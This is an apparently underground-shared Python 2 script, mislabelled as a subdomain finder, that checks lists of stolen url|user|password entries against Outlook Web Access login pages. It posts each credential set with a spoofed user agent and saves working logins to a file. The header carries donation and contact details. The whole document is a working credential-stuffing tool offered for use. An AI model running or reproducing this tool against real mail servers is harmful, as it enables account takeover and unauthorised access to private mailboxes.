# -*- coding: utf-8 -*
#!/usr/bin/python
#Subdomain Finder !
# Coded Shin_Code
#My Friendo : JametKNTLS -  h0d3_g4n - Moslem And All Coders
# Blog : https://www.blog-gan.org          
#Buy coffee :
	# BTC = 31mtLHqhaXXyCMnT2EU73U8fwYwigiEEU1
	# PERFECT MONEY  = U22270614
#CONTACT ME :(
       # ICQ : https://icq.im/Shin403
       # Telegram : t.me/Shin_code
       # Youtube : Smile Of Beauty 
# Apakah kamu hanya bisa melakukan recode dengan mengganti nama author?
# Can you only recode by changing the author name?
############# [ Module ] #############
import requests,os,re
import concurrent.futures
from colorama import Fore
import time

def checkowa(string):
	try:
		string = str(string).split('|')
		url = str(string[0]).strip()
		user = str(string[1]).strip()
		pwd = str(string[2]).strip()
		headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36'}
		data={"destination": url,
		"flags": "4",
		"forcedownlevel": "0",
		"username": user,
		"password": pwd,
		"passwordText":"",
		"isUtf8": "1"}
		janco = requests.get(url+ '/auth/logon.aspx', headers=headers,timeout=15).content
		if 'Outlook</title' in janco or '<title>Outlook' in janco or 'Outlook' in janco:
			asu = requests.post(url+'/auth.owa',data=data,headers=headers,allow_redirects=True,timeout=15).content
			asuu = requests.get(url+'/',headers=headers,allow_redirects=False,timeout=15)
			if '/owa/logoff.owa' in asu or '<title>Inbox' in asu or 'Inbox' in asu or 'Connected to Microsoft Exchange' in asu or 'ASP.forms_basic_basicmessageview_aspx' in asu:
				print(Fore.GREEN +"[Success Login] ==> "+" "+ Fore.RESET+ url+'|'+user+'|'+pwd)
				open("Owa_Success.txt","a").write(url+'|'+user+'|'+pwd+"\n")
			else:
				print(Fore.RED +"[Bad Login] ==> "+" "+ Fore.RESET+ url+'|'+user+'|'+pwd)
				#open("Owa_Bad.txt","a").write(url+'|'+user+'|'+pwd+"\n")
	except Exception as e:
		print(e)
		print(Fore.RED +"[Error] ==> "+" "+ Fore.RESET+ url+'|'+user+'|'+pwd)
	
if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print "{} Owa Valid Login Checker  !!!  | {}Shin Code\n".format(Fore.YELLOW,Fore.CYAN)
	sites = open(raw_input(Fore.BLUE + '--> Enter Your List : ' + Fore.RESET), 'r').read().splitlines()
	try:
		with concurrent.futures.ThreadPoolExecutor(3) as executor:
			executor.map(checkowa, sites)
	except Exception as e:
		print(e)
		print('Shin_Code Here !!!')
